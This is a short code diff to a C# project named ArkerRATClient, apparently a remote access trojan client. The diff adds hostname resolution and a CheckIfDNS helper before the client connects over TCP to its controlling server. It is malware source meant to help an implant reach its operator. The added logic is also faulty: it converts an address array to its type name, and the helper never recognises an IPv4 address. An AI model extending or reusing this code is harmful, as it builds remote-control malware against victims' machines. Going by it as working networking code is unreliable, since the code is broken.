@@ -38,6 +38,11 @@ namespace ArkerRATClient
             
             try
             {
+                if (CheckIfDNS(ip))
+                {
+                    ip = Dns.GetHostAddresses(ip).ToString();
+                }
+
                 tcpClient = new TcpClient(ip, port);
                 serverStream = tcpClient.GetStream();
                 serverStream.ReadTimeout = 20000;
@@ -51,6 +56,31 @@ namespace ArkerRATClient
             }
         }
 
+        private static bool CheckIfDNS(string ipOrDNS)
+        {
+            int dotCNT = 0;
+            int numberCNT = 0;
+
+            foreach (char chr in ipOrDNS)
+            {
+                if(chr== '.')
+                {
+                    dotCNT++;
+                }
+                else if (char.IsDigit(chr))
+                {
+                    numberCNT++;
+                }
+            }
+            if(dotCNT > 3 && numberCNT > 5)
+            {
+                return false;
+            }
+            else
+            {
+                return true;
+            }
+        }
 
         private static string SendIp()
         {
